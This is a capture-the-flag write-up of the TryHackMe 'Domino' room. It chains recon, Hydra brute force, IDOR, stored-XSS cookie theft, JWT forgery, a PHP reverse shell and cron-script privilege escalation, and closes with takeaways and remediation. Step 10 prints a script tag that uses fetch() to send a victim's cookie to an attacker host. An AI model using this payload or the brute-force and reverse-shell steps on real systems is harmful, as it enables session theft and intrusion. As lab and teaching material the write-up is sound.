# Domino

**Platform:** TryHackMe
**Category:** Challenge Room
**Difficulty:** Hard
**Status:** ✅ Solved (all flags captured, root shell obtained)

## Background

Domino is a long, chained web compromise against a company support portal — each stage hands the next one its key, like the tiles in its name. Public pages leak the staff list and the JavaScript leaks an AES key, which decrypts a backup file naming the system's service account. Brute-forced credentials for one staff member open the portal, where a plain **IDOR** exposes another user's flag. The session cookie is not `HttpOnly`, so a **stored XSS** in a support ticket steals the admin's cookie when they review it. An admin-only file endpoint is guarded by a **JWT** that the token service issues with the wrong role — but the JWT's signing secret is the very same key that was sitting in the public JavaScript, so a forged `admin` token is one jwt.io edit away. That unlocks a PHP shell, database credentials for the `devops` user, SSH access, and finally a root cron job executing a script that `devops` is allowed to edit. No single step is exotic; the room is the chain.

## Lab Objective

Work the full chain — recon, credential brute force, IDOR, stored-XSS cookie theft, JWT forgery, web shell, credential reuse over SSH, and cron-script abuse — capturing every flag and finishing with a root shell.

**Provided resources:** the target machine only; no credentials are given.

<img width="3099" height="648" alt="step-1" src="https://github.com/user-attachments/assets/e672ad8a-6956-4ab7-bf73-5a38ebee16ae" />


<img width="3173" height="487" alt="step-2" src="https://github.com/user-attachments/assets/ce8acbe9-90e8-48fd-8e84-c56a539759f6" />


## Walkthrough

### Step 1: Scan the Target

Nmap shows **two open ports**: SSH (22) and HTTP (80). Everything starts at the website.

<img width="2761" height="1511" alt="step-3" src="https://github.com/user-attachments/assets/1873a47f-56cc-40c9-92cd-d9670fa607b7" />


### Step 2: Recon the Site — Team Page and Tech Stack

The site presents a login page. Its public sections are worth reading before touching the login: a **Team** section lists the staff, and a **Technology** section describes the stack. The team page matters most — it shows **7 users**, and the naming format is consistent: `firstname.lastname`, for example `laura.hayes`. Note all seven names in that format; a login page plus a public staff list is a brute-force invitation.
<img width="2705" height="1442" alt="step-4" src="https://github.com/user-attachments/assets/812d7cac-be95-4828-a5d0-fa9cc3e5e55d" />


<img width="2705" height="1442" alt="step-5" src="https://github.com/user-attachments/assets/f5abcaf9-7168-4a21-a727-f177309a4169" />


<img width="2837" height="1617" alt="step-6" src="https://github.com/user-attachments/assets/547771b8-ed25-4b7c-8a4c-1c6e10eaddeb" />


<img width="2666" height="1350" alt="step-7" src="https://github.com/user-attachments/assets/85bfb1c3-f749-4daf-a4f4-658d7f891a95" />


### Step 3: Enumerate Directories with ffuf

Fuzz the site for directories:

```bash
ffuf -u http://10.48.x.x/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Three results matter: `/admin` (exists, but answers **access denied**), `/static` (the site's assets), and `/backup`.

<img width="1462" height="468" alt="step-8" src="https://github.com/user-attachments/assets/57f3ba56-004e-461f-8c4c-9ccd3d64f5a6" />


<img width="2273" height="1230" alt="step-9" src="https://github.com/user-attachments/assets/acdb1fd6-07b1-4766-bee2-d0da37089279" />


### Step 4: Read `app.js` in `/static`

The static folder holds the site's JavaScript, including `app.js`. Reading client-side code is never optional — developers leave keys, endpoints and comments in it. This file contains key material: the information needed to decrypt something, kept client-side where anyone can take it.

<img width="1915" height="832" alt="step-10" src="https://github.com/user-attachments/assets/82d1800b-e473-444d-9ab2-00530a0efc47" />


<img width="1787" height="1382" alt="step-11" src="https://github.com/user-attachments/assets/24f1055e-176d-4105-8b98-afd6952a4489" />


### Step 5: The Backup File — Decrypting the `.enc`

The `/backup` directory contains a `README.txt` and an encrypted file with an `.enc` extension. The README simply points back at `app.js` — confirming the two belong together. Download the `.enc` file.
<img width="1690" height="786" alt="step-12" src="https://github.com/user-attachments/assets/fbca03fd-3816-4c6a-be7d-4c02270a5cf5" />


<img width="1623" height="391" alt="step-13" src="https://github.com/user-attachments/assets/e56ca826-33eb-44a6-8914-fd49aabc52c4" />


<img width="2647" height="882" alt="step-14" src="https://github.com/user-attachments/assets/a643b71c-d673-45dd-bb21-8fe4034b6ce0" />


An `.enc` file is just encrypted data; opening it needs the method and key — and the key is what `app.js` gave away (its value is visible in the screenshot and is not repeated here). One wrinkle: the key is **14 bytes**, while AES-128 needs **16**, and the source itself notes to **pad to 16 bytes** — with two null bytes (`\x00\x00`) appended, the file decrypts.

<img width="2011" height="357" alt="step-15" src="https://github.com/user-attachments/assets/74bd342f-5581-4590-b7f3-85fb4e2d24aa" />


The plaintext is JSON-shaped data with two useful clues: the system user is **`devops`**, and the software version is **2.3.1**. File those away — `devops` will matter at the very end of the chain.

<img width="2730" height="397" alt="step-16" src="https://github.com/user-attachments/assets/341b6c99-47d7-46e6-a469-0ef1fbad7301" />


### Step 6: Brute-Force the Login with Hydra

Nothing so far says how to *enter* the system — but the usernames are known. Take the seven `firstname.lastname` accounts from the team page and brute-force the login form's password with Hydra against a wordlist:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.48.x.x http-post-form "..."
```

Hydra returns a working credential pair (the password appears in the screenshot and is not repeated here).

<img width="2808" height="1598" alt="step-17" src="https://github.com/user-attachments/assets/faa84269-24db-4603-bd02-480337bd268b" />


<img width="683" height="514" alt="step-18" src="https://github.com/user-attachments/assets/b68a17d3-3232-4785-b9ad-18d50139da29" />

<img width="2823" height="1159" alt="step-19" src="https://github.com/user-attachments/assets/c7aabbab-0a43-4f56-9980-79ef49e21638" />



Log in with it — the very first account tried opens the portal.

<img width="2536" height="1482" alt="step-20" src="https://github.com/user-attachments/assets/17f9473a-163b-4fe8-bbbf-2e7a630d6e33" />


<img width="2799" height="1386" alt="step-21" src="https://github.com/user-attachments/assets/a51276e8-d374-4f46-b92e-2d92820c7f73" />


### Step 7: IDOR — Change the User ID, Take the Flag

Inside the portal, user-specific pages are addressed by a numeric **ID in the URL**. That is the classic IDOR shape: the server shows whatever ID is requested without checking that it belongs to the logged-in user. Change the ID from **3 to 1** — another user's data loads, and with it, a **flag**.
<img width="2821" height="1568" alt="step-22" src="https://github.com/user-attachments/assets/9a98487f-8dc2-493a-91a9-0325b1c53895" />

<img width="1983" height="757" alt="step-23" src="https://github.com/user-attachments/assets/4d94b7a1-5a58-46a0-a006-b8ac79f1d28b" />
<img width="2001" height="685" alt="step-24" src="https://github.com/user-attachments/assets/e2195a37-f934-4005-8c90-6f4c854febca" />


### Step 8: Look for the Admin Panel — a Token and a Cookie

The next goal is the admin panel (still access-denied from outside). Poking around turns up two artefacts: a `token.php` page that issues a **token**, and — by capturing a normal request in Burp Suite — the portal's **session cookie**. Swapping the session cookie for the token value is the obvious experiment; it does **not** work. Set both aside — the token returns later in a different role.
<img width="2838" height="1150" alt="step-25" src="https://github.com/user-attachments/assets/cd51c376-66a0-4d21-bc94-c5e343d19384" />

[[IMAGE_26]]

[[IMAGE_27]]

### Step 9: The Support Ticket — Check the Cookie's Flags

The portal lets users create **support tickets** for the staff — content an admin will later read. Before writing any payload, check how the session cookie is configured in the browser's developer tools: **`HttpOnly` is false**. That single missing flag means JavaScript running in the admin's browser *can read the admin's session cookie* — the prerequisite for a stored-XSS cookie heist is met.

[[IMAGE_28]]

[[IMAGE_29]]

[[IMAGE_30]]

### Step 10: Stored XSS — Steal the Admin's Cookie

Write a ticket whose body carries a script that sends the reader's cookie to a server on Kali, along the lines of:

```javascript
<script>fetch('http://<kali-ip>:8000/?c=' + document.cookie)</script>
```

The first attempt, caught against a plain HTTP server, brings nothing. Retry the ticket with a **Netcat listener** waiting instead — and after a short while the request arrives: an admin reviewed the ticket, the script ran in their browser, and **the admin's session cookie** lands on Kali.

[[IMAGE_31]]

[[IMAGE_32]]

[[IMAGE_33]]

[[IMAGE_34]]

### Step 11: Session Hijack — Into the Admin Panel

Browse to `/admin` directly and it still says access denied — the *browser's* cookie is what identifies a normal user. Replace the session cookie in the browser with the stolen admin cookie and reload: the **admin panel opens**, and an admin **flag** is there with it. No password was ever guessed; the session itself was the credential.

[[IMAGE_35]]

[[IMAGE_36]]

[[IMAGE_37]]

### Step 12: The File Endpoint and Its Broken JWT

The admin area links to a file-reading endpoint. It is driven by a **token** — the JWT from `token.php` in Step 8. Try using it to read `/etc/passwd`: the server refuses, saying the caller lacks admin rights and hinting to inspect the token payload.

A JWT is three base64url parts separated by dots; the **payload is the middle part**. Decoding just that segment (pasting the whole token into a base64 decoder yields nothing useful — the parts must be split first) shows the problem: although the account is an admin, the token endpoint has issued the token with role **`user`**.

[[IMAGE_38]]

[[IMAGE_39]]

[[IMAGE_40]]

[[IMAGE_41]]

### Step 13: Forge an Admin JWT on jwt.io

Open the token on **jwt.io** and investigate. The payload plainly shows `"role": "user"` where `admin` is needed. Edit the role to `admin` in a fresh token — then it must be *signed*, and a signature needs the server's secret.

The secret is not new information: it is the **same key recovered from `app.js` during enumeration**, supplied in its hex form. Sign the edited token with it on jwt.io, and the forged JWT is valid — the server cannot distinguish it from one it issued itself, because it checks the signature, and the signature is genuine.

[[IMAGE_42]]

[[IMAGE_43]]

[[IMAGE_44]]

With the admin token accepted, the file endpoint opens.

[[IMAGE_45]]

### Step 14: From File Access to a Web Shell

The reachable directory contains a PHP shell file (`shell.php`). Edit its callback IP to Kali's address, serve the folder, set a Netcat listener, and call the endpoint for `shell.php`:

[[IMAGE_46]]

[[IMAGE_47]]

[[IMAGE_48]]

The listener catches the connection — a web shell on the target, running as an ordinary service user. Privilege escalation is still ahead.

[[IMAGE_49]]

[[IMAGE_50]]

### Step 15: Web-Shell Loot — a Flag and the Database File

List the working directory and read what is there: a **flag** sits in the web area.

[[IMAGE_51]]

[[IMAGE_52]]

Then open the database-related file. Querying the application's user store shows **two accounts — `root` and `devops`** — and `devops`' password is recoverable from it (the value is in the screenshot and is not repeated here). Remember the `.enc` clue from Step 5: `devops` is a *system* user on this box, not just an app account.

[[IMAGE_53]]

[[IMAGE_54]]

[[IMAGE_55]]

### Step 16: SSH as `devops`

Try the recovered password where system passwords belong:

```bash
ssh devops@10.48.x.x
```

It works — a real SSH shell as `devops`, and another **flag** in the home directory.

[[IMAGE_56]]

[[IMAGE_57]]

[[IMAGE_58]]

### Step 17: Watch the System with pspy — a Root Cron Job

Root is still missing, so watch what the machine itself runs. In `/opt/tools` there is a copy of **pspy64**, the tool that monitors processes — including cron jobs — without needing root. Run it and wait:

[[IMAGE_59]]

pspy shows a **health-report script being executed again and again** — a scheduled job, running as root. Check the script's permissions: the file lives in a monitoring-tools directory, and **`devops` can write to it**. A root cron job executing a user-writable script is the end of the chain.

[[IMAGE_60]]

[[IMAGE_61]]

[[IMAGE_62]]

### Step 18: Poison the Script, Catch Root

Edit the health-report script and append a one-line PHP reverse-shell payload pointing back at Kali. Set the listener and wait for the next scheduled run:

[[IMAGE_63]]

[[IMAGE_64]]

The job fires, the payload executes with the job's privileges — and the shell that arrives is **root**. Read the final flag from `/root`.

[[IMAGE_65]]

## Key Takeaways

- Client-side code is a disclosure. The AES key in `app.js` both decrypted the backup file *and* signed forged JWTs — one leaked secret broke two separate controls. Secrets never belong in JavaScript, and one key must never serve two purposes.
- A public staff list plus a login form is a credential attack waiting for Hydra: consistent `firstname.lastname` naming turns the team page into a username wordlist.
- IDOR is an authorisation check that never happened — changing `3` to `1` in the URL served another user's data and flag. Every object reference must be checked against the session's owner on the server.
- `HttpOnly` is not a nicety. Its absence converted a stored-XSS in support tickets directly into admin session theft; the admin panel's trust in the cookie did the rest.
- A JWT is only as strong as its secret and its issuance logic: the endpoint minted `user`-role tokens for an admin, and the signing secret was publicly known, so role forgery was trivial. Decode and inspect tokens whenever an endpoint mentions them — the payload is meant to be read.
- pspy closes rooms like this: an unprivileged user can watch root's cron jobs run, and any root-executed script writable by a normal user is a scheduled privilege escalation.

## Remediation

Keep keys and secrets out of client-side code and backups on the web root; encrypt backups with strong, unique, server-side keys, and never reuse one secret across encryption and token signing. Enforce rate limiting and lockout on login forms, and avoid publishing staff naming conventions. Implement per-object authorisation checks for every ID in a URL. Set `HttpOnly` (and `Secure`/`SameSite`) on session cookies, and sanitise all user content — support tickets included — against stored XSS. Issue JWTs with correct roles from a trusted service, sign them with a high-entropy secret held only on the server, and verify role claims server-side for sensitive endpoints. Finally, root cron jobs must execute only root-owned, non-writable scripts, and application database credentials must never double as system account passwords.
